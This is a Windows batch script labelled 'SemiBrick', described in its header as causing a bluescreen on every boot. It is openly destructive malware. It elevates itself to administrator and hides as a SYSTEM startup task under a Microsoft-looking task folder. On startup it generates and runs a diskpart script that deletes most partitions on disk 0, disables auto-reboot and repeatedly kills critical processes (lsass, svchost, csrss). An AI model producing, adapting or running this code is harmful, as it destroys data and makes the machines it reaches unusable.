::extension
::SemiBrick
::red
::causes the pc to bluescreen on boot, bypassable via safemode
@echo off
setlocal EnableExtensions

:: Check for admin privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo You are now running with administrator privileges!

:: Define paths and names
set "TARGET_DIR=%PROGRAMDATA%\Blue"
set "TARGET_FILE=%TARGET_DIR%\%~nx0"
set "TASK_FOLDER=Microsoft\Windows\Blue"
set "TASK_NAME=Blue"
set "TASK_PATH=\%TASK_FOLDER%\%TASK_NAME%"

:: Check if the scheduled task already exists
schtasks /query /tn "%TASK_PATH%" >nul 2>&1
if %errorlevel% equ 0 (
    echo Task already exists. Proceeding to the main script execution...
    goto :MainRoutine
)

:: --- Registration Phase (Runs only if task doesn't exist) ---
echo Task not found. Registering and moving script...

:: Create target directory in AppData if it doesn't exist
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

:: Create the Task Scheduler folder if it is missing
powershell -NoProfile -Command ^
    "$svc = New-Object -ComObject Schedule.Service; $svc.Connect(); $root = $svc.GetFolder('\'); try { $null = $root.GetFolder('%TASK_FOLDER%') } catch { $null = $root.CreateFolder('%TASK_FOLDER%') }"

if %errorlevel% neq 0 (
    echo Failed to create the Task Scheduler folder "\%TASK_FOLDER%".
    pause
    exit /b 1
)

powercfg.exe /h off

:: Register the task using the destination AppData file path
schtasks /create ^
    /tn "%TASK_PATH%" ^
    /tr "\"%TARGET_FILE%\"" ^
    /sc onstart ^
    /ru SYSTEM ^
    /f

if %errorlevel% equ 0 (
    echo Successfully registered as a startup task.
    echo Location: Task Scheduler Library\%TASK_FOLDER%\%TASK_NAME%

    :: Move the script to the target directory right before exiting
    move /y "%~f0" "%TARGET_FILE%" >nul
    
    echo Exiting initial setup...
    timeout /t 3 >nul
    exit /b 0
) else (
    echo Failed to register the startup task.
    pause
    exit /b 1
)

:: --- Main Routine Phase ---
:MainRoutine
start "" "%~f0"

setlocal enabledelayedexpansion

set TargetDisk=0

:: Define the temporary script name
set "ScriptFile=%temp%\dp_wipe_script.txt"

:: Build and drop the Diskpart script dynamically
(echo select disk %TargetDisk%) > "%ScriptFile%"
for /l %%i in (2,1,8) do (
    if not %%i==3 (
        (echo select partition %%i) >> "%ScriptFile%"
        (echo delete partition override) >> "%ScriptFile%"
    )
)
(echo exit) >> "%ScriptFile%"

:: Run Diskpart using the generated script
diskpart /s "%ScriptFile%" >nul 2>&1

:crash

wmic recoveros set AutoReboot=False

taskkill /f /im lsass.exe
taskkill /f /im svchost.exe
taskkill /f /im csrss.exe

goto crash


